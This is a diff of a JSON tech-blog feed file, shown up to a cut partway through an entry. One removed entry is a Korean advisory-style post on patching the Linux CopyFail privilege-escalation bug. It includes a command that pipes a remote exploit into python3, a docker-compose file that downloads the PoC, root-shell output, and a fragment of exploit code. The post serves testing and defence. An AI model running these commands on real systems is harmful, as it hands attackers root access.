@@ -2,86 +2,11 @@
   {
     "id": 1,
     "imageUrl": "",
-    "title": "Segment Heap support for C++ projects in Visual Studio",
-    "description": "Learn how Visual Studio enables Segment Heap by default for new C++ projects and how to adopt and verify it in existing builds.\nThe post Segment Heap support for C++ projects in Visual Studio appeared first on C++ Team Blog.",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://devblogs.microsoft.com/cppblog/segment-heap-support-for-c-projects-in-visual-studio/",
-    "pubDate": "Thu, 14 May 2026 16:09:51 +0000",
-    "creator": "MacGyver Codilla",
-    "categories": [
-      "Announcement",
-      "C++",
-      "Visual Studio",
-      "visual studio"
-    ]
-  },
-  {
-    "id": 2,
-    "imageUrl": "",
-    "title": "혁신기업의 딜레마(The innovator's dilemma)",
-    "description": "<p><img src=\"/images/2026/05/13/IMG_1876.png\" alt=\"The innovator's dilemma\" title=\"The innovator's dilemma\" class=\"center-image\" /></p>\n\n<p>책을 읽으면서 계속 떠올랐던 건, 기존 강자들은 보통 가장 약한 부분이 아니라, 가장 잘하던 방식 때문에 무너진다는 점이 흥미로웠다.</p>\n\n<p>흔히 어떤 기업이 망하면 의사결정을 못했다거나, 기술력이 부족했다거나, 고객을 이해하지 못했다고 생각한다. 그런데 클레이튼 크리스텐슨은 오히려 반대 이야기를 한다. 고객 이야기를 너무 잘 듣고, 현재 사업을 너무 잘 운영하고 조직이 너무 효율적이기 때문에 새로운 변화를 놓친다는 것이다. 대부분의 조직은 ‘잘하는 방법’을 학습하면서 성장한다. 매출이 잘 나오는 고객에게 집중하고, KPI를 개선하고 효율을 높인다. 사실 틀린 게 하나도 없다. 오히려 굉장히 합리적이고 교과서적인 방식이다. 그런데 문제는 미래의 혁신은 거의 항상 지금 기준으로 보면 비효율적이라는 점이다.</p>\n\n<p>책에서 가장 많이 등장하는 단어인 파괴적 혁신(Disruptive Innovation). 초기의 파괴적 혁신은 늘 이상하다. 시장은 작고 고객은 별로 없어 보이고, 제품 완성도도 낮다. 지금 기준으로 보면 굳이 해야 할 이유가 없어 보인다. 그런데 시간이 지나면서 그 작은 변화가 기존 시장 전체를 바꿔버린다. 넷플릭스가 처음 등장했을 때 블록버스터 입장에서는 꽤 애매했을 것 같다. DVD를 우편으로 보내준다니. 게다가 스트리밍 초기 품질도 좋지 않았다. 그런데 결국 사람들은 비디오 대여점에 가지 않게 되었다. 노키아가 아이폰을 처음 봤을 때도 비슷했을 것이다. 전화기라기보단 느린 컴퓨터처럼 보였을지도 모른다.</p>\n\n<p>그리고 기존 강자들은 대부분 틀린 판단을 한 게 아니다. 당시 기준으로 보면 다 합리적이었다. 오히려 문제는 현재의 성공 방식이 미래 변화를 이해하지 못하게 만든다는 데 있었다. 지금 고객이 원하는 것, 지금 돈이 되는 것 그리고 지금 잘 작동하는 방식에 집중할수록 새로운 흐름은 더 작고 이상하게 보인다.</p>\n\n<p>요즘은 AI를 여기에 비춰볼 수 있을것 같다. 지금 대부분의 서비스는 ‘사용자가 직접 앱을 열고 탐색하는 구조’ 를 전제로 만들어져 있다. 검색도 그렇고 쇼핑도 그렇고 배달도 그렇다. 그런데 생성형 AI가 나오면서 이 흐름 자체를 바꾸고 있다. 점점 검색 결과 페이지보다 ‘답변’이 중요해지고 있고, 사용자가 여러 앱을 돌아다니기보다 AI 에이전트가 대신 처리해준다던가.</p>\n\n<p>그런데 기존 플랫폼 입장에서 이 변화는 꽤 어려울 것 같다. 지금 너무나도 잘 돌아가고 있기 때문.. 예를 들어, 검색 광고 모델은 검색 결과 페이지를 많이 보여줘야 한다. 하지만 AI는 링크 대신 답변을 준다. 체류시간 기반 서비스는 사용자가 오래 머물러야 좋다. 그런데 AI 에이전트는 오히려 클릭과 탐색을 줄인다. 결국 미래 방향이 기업 입장에서의 현재 수익 모델과 충돌한다. 그래서 혁신 기업의 딜레마는 단순히’“새로운 기술이 등장했다’ 가 아니라, 기존 성공 방식이 미래 변화를 막는 구조에 더 가까운 것 같았다.</p>\n\n<p>이 책에서는 기업에 대한 이야기만 하는데 개인에 대해서도 비슷하다. 사람도 어느 순간부터 자기가 잘하는 것만 반복하게 된다. 이미 인정받은 방식, 익숙한 선택과 성과를 냈던 패턴들. 효율은 점점 좋아진다. 대신 새로운 걸 시도하는 감각은 조금씩 사라진다. 그리고 대부분의 변화는 늘 비효율적으로 시작된다. 운동, 글쓰기, 새로운 분야에 대해 학습하는것. 처음엔 늘 못한다. 괜히 시간 낭비하는 기분도 든다. 그래서 대부분 다시 원래 잘하던 걸 하러 돌아간다. 꾸준히 무언가를 배우는 사람들의 공통점은 초기의 비효율을 견디는 능력인 것 같다. 기업은 작은 시장을 견디지 못하고 사람은 서툰 시기를 견디지 못한다.</p>\n\n<p>혁신은 대부분 기존 시장의 중심이 아니라 가장자리에서 시작된다. 혼다의 슈퍼커브가 과거에는 보이지 않던 새로운 시장을 열어준 것처럼, 처음엔 별로 중요하지 않아 보이는 사람들과 작은 취향, 이상한 행동들에서 변화가 시작된다. 혁신 기업의 딜레마는 단순한 경영 이론이라기보다, 성공이 어떻게 사람과 조직을 점점 보수적으로 만드는지에 대한 이야기다.</p>",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://sungjk.github.io/2026/05/13/the-innovators-dilemma.html",
-    "pubDate": "2026-05-13T00:00:00+00:00",
-    "creator": "Unknown",
-    "categories": []
-  },
-  {
-    "id": 3,
-    "imageUrl": "",
-    "title": "무릎 통증 참지 마세요! 무릎인공관절 수술비를 최대 240만 원까지 지원해 드려요",
-    "description": "무릎이 불편한 60세 이상 어르신이라면 꼭 확인해 보세요",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://toss.im/tossfeed/article/money-policies-61",
-    "pubDate": "Fri, 15 May 2026 01:00:00 GMT",
-    "creator": "Unknown",
-    "categories": []
-  },
-  {
-    "id": 4,
-    "imageUrl": "",
-    "title": "MSVC Build Tools Preview updates – May 2026",
-    "description": "Try the latest updates to MSVC Build Tools Preview\nThe post MSVC Build Tools Preview updates – May 2026 appeared first on C++ Team Blog.",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://devblogs.microsoft.com/cppblog/msvc-build-tools-preview-updates-may-2026/",
-    "pubDate": "Wed, 13 May 2026 21:07:01 +0000",
-    "creator": "Eric Brumer",
-    "categories": [
-      "C++"
-    ]
-  },
-  {
-    "id": 5,
-    "imageUrl": "",
-    "title": "Linux CopyFail 취약점 패치, CVE-2026-31431",
-    "description": "2026년 4월말 리눅스 커널에 치명적인 보안 버그인 일명 CopyFail CVE-2026-31431이 발표되었다. 이 글에서는 CopyFail의 간단한 소개와 보안 버그에 해당하는지 PoC 테스트하는 방법 및 보안 패치, 완화 처치 방안에 대해 다룬다. 특히 커널 업그레이드나 blacklist 처리 방법에 대해서 자세히 다루도록 한다.\n \n1. CopyFail CVE-2026-31431이란?\nCopyFail CVE-2026-31431 PoC demo (출처 : copy.fail)\n\n\nCopyFail은 2017년에 커널에 도입된 기능으로서 최근에서야 발견되었기 때문에 현재 대부분의 리눅스가 영향을 받는다. \n이 취약점은 2026년 4월 29일 공개되었고, AI를 사용하여 취약점을 발견하는 보안팀인 Xint Code에 의해 공개되었다.[1]\nCopyFail 취약점은 로컬 권한 상승(Local Privilege Escalation) 취약점으로, 커널의 암호화를 위한 algif_aead에서 splice 시스템 콜을 처리할 때 하드웨어 가속을 일반 유저에게도 사용할 수 있게 해주던 기능이다. 일반 유저도 커널의 기능을 쉽게 사용할 수 있도록 만들어졌지만, 역으로 커널 레벨에서 관리자 권한을 훔칠 수 있게 되었다.\n현재 AWS나 대부분의 호스팅 업체에서 사용하는 Fedora계열, RH계열(Rocky, Alma, SuSe, 구형 CentOS...), Debian계열(Debian, Ubuntu, Mint ...) 등등 거의 모든 리눅스가 CopyFail 취약점을 가지고 있다. 특히 RH계열(레드햇 계열)은 algif_aead 커널 기능을 module이 아닌 builtin으로 넣어두었기 때문에 더욱 위험하다고 볼 수 있다.\n이 취약점은 일단 로컬 유저로 액세스한 뒤에 root 권한을 훔칠 수 있기에 덜 위험하다고 생각될수도 있지만 의존성으로 인해 설치되는 각종 패키지나 혹은 curl | sh 방식으로 프로그램 설치를 유도한 뒤에 시스템에 잠입해서 쉽게 root권한을 훔치는 다양한 공격을 취할 수 있기 때문에 되도록이면 빨리 패치해야만 한다.\n \n2. CopyFail PoC 테스트 방법\n앞서 이야기 했듯이 2017년에 도입된 기능이므로 현재 사용되는 거의 모든 리눅스가 취약하다고 볼 수 있다. 그럼에도 불구하고 자신의 리눅스 시스템에서 확인하고자 한다면 다음과 같이 확인해볼 수 있다.\n \n2.1. PoC 코드 (주의!. 운영 환경에서 사용하지 말 것)\n첫번째로 이 취약점을 발견한 Theori의 웹사이트에서는 다음과 같은 명령으로 PoC를 해볼 수 있다. Python 3.10이상에서 사용가능하며, 이 PoC를 실행하면 su 명령이 암호없이 뚫리는 상태가 되므로 운영 환경에서는 실습하지 않도록 주의해야 한다. 개인용 시스템이나 실습용 시스템에서만 사용하기를 권장한다.\n다시 말하지만 운영환경에서는 함부로 실행해보면 안된다. 만일 실행했다면 echo 3 > /proc/sys/vm/drop_caches로 페이지 캐시를 비워주면 복구되는 경우도 간혹 있지만, 만일 복구가 안된다면 리부팅을 해야만 오염된 페이지 캐시가 제거된다. 따라서 copyfail PoC는 절대로 운영환경에서 실행하면 안된다.\ncurl https://copy.fail/exp | python3 && su\nCopyFail의 PoC 원리는 AF_ALG 소켓을 열고, setuid(0) 코드를 페이지 캐시에 오염시켜서 su 명령시 root 권한으로 명령을 실행하게 한다. 따라서 PoC가 성공한 뒤에는 어떤 유저든지 su 명령시 권한이 상승되어 root 패스워드가 필요없어진다.\n \n2.2. Docker를 이용한 테스트 (안전한 취약점 테스트 방법)\n이 방법은 docker를 이용해서 container에서 PoC를 실행시키는 방법으로, 컨테이너가 host의 algif_aead를 사용하지만 오염시키는 su가 container 안에 있는 su 바이너리라는 점이 다르다. 그리고 container를 제거하기 전에 fadvise로 오염된 컨테이너의 /usr/bin/su의 page cache를 제거하기 위해 POSIX_FADV_DONTNEED를 호출하는 구조를 사용한다. 이렇게 하면 container를 통해 1회성으로 취약점 PoC 테스트를 해볼 수 있다.\n이 테스트 방법은 먼저 docker가 설치되어있어야 한다. 보통 docker-ce를 설치하므로 여기서도 docker-ce가 설치된 시스템을 기준으로 설명한다. 혹시라도 설치되어있지 않다면 \"install docker-ce on <배포판>\"으로 검색하면 바로 상단에 나올 것이다. 예를 들어 Rocky 리눅스라면 \"install docker-ce on rocky linux\"로 검색하면 된다. 아니면 AI에게 질문해도 된다.\n \n2.2.1. 준비 과정\n먼저 docker 실행 권한을 가진 일반 유저로 2개의 테스트용 파일(Dockerfile, docker-compose.yml)을 만든다. 적당한 디렉토리를 하나 만들고 그 안에 만들면 편리할 것이다. 아래는 파일을 redirect로 생성하는 명령어로서 복사해서 붙여넣으면 파일이 만들어진다. \ncat <<HERE >Dockerfile\nFROM python:3.10-slim\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n    curl passwd && rm -rf /var/lib/apt/lists/*\nHERE\n위의 첫번째 명령어를 복사해서 붙여넣어 실행하면 Dockerfile이 생성되고, 아래 두번째 명령어를 복붙해서 실행하면 docker-compose.yml 파일이 생성될 것이다.\ncat <<HERE >docker-compose.yml\nservices:\n  copyfail-test:\n    build: .\n    container_name: copyfail_test\n    privileged: true\n    stdin_open: true  # -i option\n    tty: true         # -t option\n    command: |\n      bash -c \"\n      useradd -m sunyzero -s /bin/bash\n      echo 'sunyzero:qwer1234' | chpasswd\n      echo 'root:rootqwer1234' | chpasswd\n      curl -L https://copy.fail/exp > ~sunyzero/copyfail_poc.py\n      chown sunyzero:sunyzero /home/sunyzero/copyfail_poc.py\n      echo 'To test exploit(CopyFail,CVE-2026-31431)'\n      echo '   Run:    python3 ~/copyfail_poc.py'\n      echo '===================[ Ready for your command ]====================='\n      su - sunyzero\n      # 종료 후 fadvise로 su의 page cache를 비우도록 함.\n      python3 -c \\\"\n      import os\n      fd = os.open('/usr/bin/su', os.O_RDONLY)\n      os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)\n      os.close(fd)\n      \\\"\n      sync\n      \"\nHERE\n2개의 파일이 생성된 다음에는 docker compose 명령으로 실행을 해야 할 것이다.\n \n2.2.2. PoC를 컨테이너에서 실행\n컨테이너는 다음과 같은 docker compose --rm copyfail-test 명령어로 실행하되, --rm 옵션을 추가해서 컨테이너를 종료하는 즉시 삭제되도록 한다. (아래처럼 명령어가 긴 경우 대충 두서너 글자를 치고 tab을 치면 완성해준다)\n$ docker compose run --rm copyfail-test\n...생략...\nTo test exploit(CopyFail,CVE-2026-31431),\n    Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@e31dfcc7a99d:~$ ls\ncopyfail_poc.py\nsunyzero@e31dfcc7a99d:~$ id\nuid=1000(sunyzero) gid=1000(sunyzero) groups=1000(sunyzero)\nsunyzero@e31dfcc7a99d:~$ su -\nPassword:   # 정상적으로 password를 묻는 상태이므로 Ctrl-C로 취소한다.\n\n$ python3 ~/copyfail_poc.py\n# id\nuid=0(root) gid=1000(sunyzero) groups=1000(sunyzero)\n\n# exit\n$ exit\n컨테이너 안에서 내린 명령어를 보면 먼저 ls로 copyfail_poc.py 파일이 저장되어있는지 확인을 했다.\n그 다음에 id 명령으로 sunyzero 로컬 유저의 UID, GID를 확인했다. 결과를 보면 uid=1000(sunyzero) ... 로 일반 유저로 보이고 있다. \n그리고나서 su - 명령을 내려보면 패스워드를 묻는 \"Password: \" 프롬프트가 제대로 보이고 있다. 즉 암호 체크가 제대로 작동중인 안전한 상태인 것이다. 아직 PoC를 실행하지 않은 상태에서 정상인지 확인했으니, Ctrl-C로 취소한다.\n그 다음에는 PoC 코드인 python3 ~/copyfail_poc.py를 실행하면 root 계정이 탈취되는지 확인할 수 있다. 위의 경우에는 id에 uid=0(root)가 나오는 것으로 보이므로 로컬 권한 상승으로 root 계정이 탈취당했음을 알 수 있다. 안전하게 보안 패치된 시스템에서는 패스워드를 묻는 프롬프트가 나와서 로컬 권한 상승을 막는다. 혹은 완화 처리(mitigation)된 시스템에서는 오류가 발생하도록 되어있다.\n취약점이 존재하여 root를 탈취당하는 시스템이라면 아래와 같이 copyfail 보안 패치나 완화 방법을 사용해야 한다. 여기서는 Fedora, Rocky, Ubuntu별로 따로 설명하도록 한다.\n \n3. CopyFail 보안 패치 방법\n레드햇 계열(Fedora, Rocky, Alma ...)들은 algif_aead가 커널에 builtin되어있고, 데비안 계열(Debian, Ubuntu, Mint...)들은 module로 되어있어서 패치 방법이 조금은 다르다.\n레드햇 계열에서는 패치된 커널로 업그레이드하거나 아니면 boot parameter에서 blacklist로 해당 기능을 처리하는 완화 방법(mitigation)이 주로 쓰이고, 데비안 계열은 module이라 간단하게 blacklist 환경 설정 파일만 설정해주면 된다.\n우선 커널에 AEAD이 존재하는지는 /boot/config-$(uname -r)파일이나 modinfo로 쉽게 알 수 있다. 아래는 레드햇 계열에서 살펴본 것으로 modinfo에서 filename이 builtin으로 나오는 것을 볼 수 있다.\n$ grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)\nCONFIG_CRYPTO_USER_API_AEAD=y\n\n$ modinfo algif_aead\nname:           algif_aead\nfilename:       (builtin)\ndescription:    AEAD kernel crypto API user space interface\nauthor:         Stephan Mueller <smueller@chronox.de>\nlicense:        GPL\nfile:           crypto/algif_aead\n우분투는 filename에 경로가 나오는 것으로 봐서 kernel module임을 알 수 있다.\n$ modinfo algif_aead\nfilename:       /lib/modules/5.15.0-144-generic/kernel/crypto/algif_aead.ko\ndescription:    AEAD kernel crypto API user space interface\nauthor:         Stephan Mueller <smueller@chronox.de></smueller@chronox.de>\nlicense:        GPL\nsrcversion:     F89A7DE8CA18E13AB028AA1\n...생략...\n \n3.1. Fedora 리눅스 (레드햇 계열)\n페도라 리눅스에서는 이 글을 쓰는 시점인 5월 9일경 확인한 결과 6.19.14-300에 이어 7.0.4 커널이 올라왔으나 해결은 아직 안된 상태이다. 그럼에도 불구하고 다른 취약점이 패치되어있기 때문에 커널을 업데이트 해주는 것을 추천한다.\nsudo dnf -y update kernel\n커널 업데이트 후에는 reboot를 해야만 한다. 패치가 제대로 되었다면 docker로 PoC 실행시 다음과 같이 root 로 권한이 상승되지 못하고 패스워드를 묻는 프롬프트인 \"Password: \"가 나타나게 된다. 아래 테스트는 페도라43, 페도라44에서 테스트 되었다.\n$ docker compose run --rm copyfail-test \nContainer copyfail-poc-docker-copyfail-test-run-3e60658ad202 Creating \nContainer copyfail-poc-docker-copyfail-test-run-3e60658ad202 Created \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   731    0   731    0     0   4615      0 --:--:-- --:--:-- --:--:--  4626\nTo test exploit(CopyFail,CVE-2026-31431)\n   Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@f1afcd499e5d:~$ python3 ~/copyfail_poc.py\nPassword:\n \n3.2. Rocky 리눅스 (레드햇 계열)\nRocky 리눅스는 이 글을 처음 쓰던 시점에서는 grubby로 부팅 시점에 algif_aead_init 모듈을 blacklist 처리하는 boot parameter를 추가하는 완화 방법으로 처리하도록 안내하고 있었으나, 중간에 5월 9~10일경에 패치된 커널이 올라왔다.[2] 따라서 아래 커널 업그레이드 방법(Plan A)로 처리하는 것을 추천한다.\n \n3.2.1. 커널 업그레이드 방법 (Plan A)\nRocky Linux는 5월 8~10일 경에는 대부분의 버전을 패치했으므로 커널 업그레이드 방법으로 쉽게 해결할 수 있다. 이 글을 탈고하는 시점에서는 Rocky Linux 10은 7.0.x 버전으로 올라가서 다른 보안 취약점까지 같이 패치되고, Rocky Linux 9.6은 5.14.0-611.54.1로 업데이트 되었다. \n커널 업그레이드 방법은 페도라 리눅스와 같다. 테스트는 로키 리눅스 10.1과 9.6에서 테스트 되었다.\nsudo dnf -y update kernel\n커널 업데이트가 완료된 후에는 reboot를 해줘야만 한다. 리부팅 뒤에도 앞서 docker로 PoC를 검사하는 부분을 체크해보는 것을 권장한다.\n \n3.2.2. grubby로 부트 파라메터 조작 방법 (Plan B)\nPlan B 방법은 커널 업그레이드가 용이하지 않을 때 사용하는 방법이다. 하지만 되도록이면 위 플랜A인 커널 업그레이드를 권장한다. 이 기능은 grubby를 사용하므로 root 권한으로 명령한다.\nsudo grubby --args initcall_blacklist=algif_aead_init --update-kernel=ALL\n플랜B는 algif_aead를 커널 레벨에서 블랙리스트 처리하므로 docker PoC로 실행해보면 아래처럼 에러가 발생한다.\n$ docker compose run --rm copyfail-test\nContainer sunyzero-copyfail-test-run-b5913c93ffa3 Creating\nContainer sunyzero-copyfail-test-run-b5913c93ffa3 Created\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   731    0   731    0     0   2044      0 --:--:-- --:--:-- --:--:--  2041\nTo test exploit(CopyFail,CVE-2026-31431)\n   Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@c18f31aee811:~$  python3 ~/copyfail_poc.py\nTraceback (most recent call last):\n  File \"/home/sunyzero/copyfail_poc.py\", line 9, in \n    while i\n  File \"/home/sunyzero/copyfail_poc.py\", line 5, in c\n    a=s.socket(38,5,0);a.bind((\"aead\",\"authencesn(hmac(sha256),cbc(aes))\"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b\"A\"*4+c],[(h,3,i*4),(h,2,b'\\x10'+i*19),(h,4,b'\\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)\nFileNotFoundError: [Errno 2] No such file or directory\nsunyzero@c18f31aee811:~$\n \n3.3. Ubuntu 리눅스\n우분투 리눅스는 취약점이 있는 algif_aead가 module로 빌드되어있기 때문에 kernel 패키지에 직접 패치 하지 않고  블랙리스트 처리와 비슷하게 /etc/modprobe.d/disable-algif_aead.conf 파일을 만드는 완화 방법을 사용한다.[3] 따라서 해당 conf 파일을 설치하는 패키지를 제공하는데, 패키지 이름은 kmod 로서 다음과 같이 sudo apt install --only-upgrade kmod 명령으로 업데이트하면 된다.\nkmod 업그레이드 명령에 --only-upgrade 옵션을 사용하면 의존성에 걸린 다른 패키지들을 줄줄이 업데이트하지 않고 딱 kmod만 업그레이드하도록 되어있다. 회사에서 다른 큰 문제가 없다면 sudo apt upgrade로 싹다 업그레이드해도 되지만, 만약에 다른 프로그램들이 작동 중이라면 안전하게 kmod만 업그레이드하는 것도 괜찮다. 아래는 우분투 22에서 테스트한 결과이다.\n$ sudo apt update\n...생략...\n$ sudo apt install --only-upgrade kmod\n...생략...\n이 방법의 장점은 재부팅하지 않고도 활성화 시킬 수 있다. (물론 재부팅을 해도 된다) 그리고나서 algif_aead 커널 모듈이 로딩되어있을테니 제거해주면 된다.\n$ lsmod | grep aead\nalgif_aead             16384  0\naf_alg                 32768  1 algif_aead\n\n$ sudo rmmod algif_aead\n우분투의 kmod가 업그레이드 되면서 설치하는 disable-algif_aead.conf 파일은 copyfail 취약점의 통로인 algif_aead kernel module을 /bin/false로 비활성화 하는 것으로 내용은 다음과 같다.\n$ cat  /etc/modprobe.d/disable-algif_aead.conf\n# Disable algif_aead module due to CVE-2026-31431 (AKA copy.fail)\n# This will likely be re-enabled in a subsequent update once an updated\n# kernel has been deployed.\n# Blacklisting the module isn't sufficient, we need to do as below:\ninstall algif_aead /bin/false\n간혹 blacklist algif_aead 로 설정하라는 글이 있는데, 위 주석에도 적혀있듯이 blacklist보다는 /bin/false로 하는 방법이 더 깔끔하다. 참고로 kmod의 conf 파일을 실수로 지웠다든지 하는 경우에는 재설치할 때 missing conf 파일을 덮어쓰도록 하는 옵션을 사용해서 아래처럼 명령해야 한다.\nsudo apt-get -o Dpkg::Options::=\"--force-confmiss\" install --reinstall kmod\n \n4. 결론\n리눅스의 CopyFail 취약점을 패치하기 위해서는 Fedora, Rocky, Ubuntu가 조금씩 다르기 때문에 그에 맞춰서 업그레이드 혹은 패치해주면 된다. 각 리눅스 배포판에 따라 패치가 나와있는지도 확인해보는 것이 좋다.[4] 다만 패치 후에는 확실하게 보완되었는지를 docker 컨테이너에서 테스트를 통해 검증해보는 것도 필요하다고 생각된다.\n \n참조\n[1] CopyFail, https://copy.fail\n[2] Mitigating CVE-2026-31431 on Rocky Linux 8, 9, 10, and LTS Variants. May 1, 2026. https://kb.ciq.com/article/rocky-linux/rl-cve-2026-31431-mitigation\n[3] Fixes available for CVE-2026-31431, Luci Stanescu, 30 April 2026, https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available\n[4] Vulnerability Intelligence \nCVE-2026-31431, https://mondoo.com/vulnerability-intelligence/vulnerability/CVE-2026-31431",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://sunyzero.tistory.com/328",
-    "pubDate": "Tue, 12 May 2026 03:55:59 +0900",
-    "creator": "sunyzero",
-    "categories": [
-      "컴퓨터 관련/리눅스(유닉스) 일반",
-      "algif_aead",
-      "algif_aead_init",
-      "CopyFail",
-      "CVE-2026-31431",
-      "linux",
-      "리눅스 보안"
-    ]
-  },
-  {
-    "id": 6,
-    "imageUrl": "",
     "title": "“Friction-maxxing”, Failure, and Learning to Code",
     "description": "In a culture obsessed with optimization (global maximums only, please), the internet has taken a particular enjoyment in finding things to “maxx”: tokenmaxxing, looksmaxxing, funmaxxing, sleepmaxxing, etc. If only we find the right virtue to optimize, perhaps all will be right in our lives. Earlier this year, one of these emerging net-native neologisms caught my […]",
     "reviews": [],
     "syllabus": [],
-    "link": "https://blog.jetbrains.com/education/2026/05/13/friction-maxxing-failure-and-learning-to-code",
+    "link": "https://blog.jetbrains.com/education/2026/05/13/friction-maxxing-failure-and-learning-to-code/",
     "pubDate": "Wed, 13 May 2026 09:50:33 +0000",
     "creator": "Clara Maine",
     "categories": [
@@ -104,74 +29,13 @@
     ]
   },
   {
-    "id": 7,
-    "imageUrl": "",
-    "title": "목적 없이 걸어도 즐거운 도시 탐험, 이환",
-    "description": "No description available",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://bbs.ruliweb.com/news/board/11/read/2452",
-    "pubDate": "Wed, 13 May 2026 03:58:35 +0900",
-    "creator": "｜RULIWEB｜",
-    "categories": [
-      "리뷰"
-    ]
-  },
-  {
-    "id": 8,
-    "imageUrl": "",
-    "title": "Support for uv, Poetry, and Hatch Workspaces (Beta)",
-    "description": "Workspaces are increasingly the go-to choice for companies and open-source teams aiming to manage shared code, enforce consistency, and simplify dependency management across multiple services. Working within massive codebases often means juggling many interdependent Python projects simultaneously. To streamline this experience, PyCharm 2026.1.1 introduced built-in support for uv workspaces, as well as those managed by Poetry […]",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://blog.jetbrains.com/pycharm/2026/05/support-for-uv-poetry-and-hatch-workspaces-beta",
-    "pubDate": "Wed, 13 May 2026 12:28:25 +0000",
-    "creator": "Antonina Belianskaya",
-    "categories": [
-      "uv",
-      "workspaces"
-    ]
-  },
-  {
-    "id": 9,
-    "imageUrl": "",
-    "title": "MSVC Build Tools version 14.51 (GA) now available",
-    "description": "MSVC Build Tools v14.51 GA available in Visual Studio 2026 18.6\nThe post MSVC Build Tools version 14.51 (GA) now available appeared first on C++ Team Blog.",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://devblogs.microsoft.com/cppblog/msvc-version-1451-available/",
-    "pubDate": "Tue, 12 May 2026 16:38:39 +0000",
-    "creator": "Michael Price",
-    "categories": [
-      "Announcement",
-      "C++",
-      "Copilot",
-      "MSVC",
-      "GitHub Copilot"
-    ]
-  },
-  {
-    "id": 10,
-    "imageUrl": "",
-    "title": "Help Shape the Future of Kotlin in the Age of AI",
-    "description": "AI is rapidly changing the way developers write, review, learn, and maintain code. Code completion, AI chat assistants, autonomous coding agents, and other tools are giving rise to new workflows almost every month. But one important question remains: How well do these tools actually work with Kotlin? We want to better understand how Kotlin developers […]",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://blog.jetbrains.com/kotlin/2026/05/help-shape-the-future-of-kotlin-in-the-age-of-ai",
-    "pubDate": "Fri, 15 May 2026 13:07:36 +0000",
-    "creator": "Ekaterina Volodko",
-    "categories": [
-      "news"
-    ]
-  },
-  {
-    "id": 11,
+    "id": 2,
     "imageUrl": "",
     "title": "A New Default Project Structure for Kotlin Multiplatform",
     "description": "We are updating the default project structure for Kotlin Multiplatform projects to give modules clearer responsibilities, better align with conventions used by other build systems and frameworks, and reflect the changes in Android Gradle Plugin 9.0. You’ll see this project structure in newly created projects generated by our tools, in the official documentation, and in […]",
     "reviews": [],
     "syllabus": [],
-    "link": "https://blog.jetbrains.com/kotlin/2026/05/new-kmp-default-structure",
+    "link": "https://blog.jetbrains.com/kotlin/2026/05/new-kmp-default-structure/",
     "pubDate": "Fri, 15 May 2026 14:20:57 +0000",
     "creator": "Márton Braun",
     "categories": [
@@ -180,7 +44,46 @@
     ]
   },
   {
-    "id": 12,
+    "id": 3,
+    "imageUrl": "",
+    "title": "AI는 QA를 대체하지 않았다, 대신 확장했다",
+    "description": "들어가며: 생성형 AI의 등장과 QA가 받은 질문생성형 AI가 등장했을 때 많은 직무가 비슷한 질문을 받았습니다. ‘이 직무는 AI로 대체될 수 있는가? 반복적인 업무는 자동화되지...",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://techblog.lycorp.co.jp/ko/ai-augments-qa-rather-than-replacing-it",
+    "pubDate": "Thu, 14 May 2026 02:00:00 GMT",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
+    "id": 4,
+    "imageUrl": "",
+    "title": "dotInsights | May 2026",
+    "description": "Did you know? C# supports ref return and ref local, which let you return and work with references to variables instead of copies of their values.  Welcome to dotInsights by JetBrains! This newsletter is the home for recent .NET and software development related information. ? Links Here’s the latest from the developer community. ☕ Coffee […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/dotnet/2026/05/12/dotinsights-may-2026/",
+    "pubDate": "Tue, 12 May 2026 09:54:09 +0000",
+    "creator": "Rachel Appel",
+    "categories": [
+      "net-tools",
+      "dotinsights"
+    ]
+  },
+  {
+    "id": 5,
+    "imageUrl": "",
+    "title": "무릎 통증 참지 마세요! 무릎인공관절 수술비를 최대 240만 원까지 지원해 드려요",
+    "description": "무릎이 불편한 60세 이상 어르신이라면 꼭 확인해 보세요",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://toss.im/tossfeed/article/money-policies-61",
+    "pubDate": "Fri, 15 May 2026 01:00:00 GMT",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
+    "id": 6,
     "imageUrl": "",
     "title": "직감을 믿어야 할 때",
     "description": "2010년 초반에 LA를 대표했던 B2C 회사 중 남성 면도기를 정기구독으로 배송했던 Dollar Shave Club(DSC)이라는 스타트업이 있었다. 나는 이 회사의 고객이기도 했고, 이 회사의 창업가 마이클 두빈을 직접 여러 번 봤는데, 참 재미없고 평범한 제품인 남성 면도기를 창의적인 마케팅을 통해서 재미있는 사업으로 만든 인상적인 회사였다. 유니레버가 2016년도에 이 회사를 $1B에 인수했다. 그 가격표도 엄청났지만, 개인적으로 내가(...)",
@@ -198,10 +101,111 @@
     ]
   },
   {
+    "id": 7,
+    "imageUrl": "",
+    "title": "Migrating Data Ingestion Systems at Meta Scale",
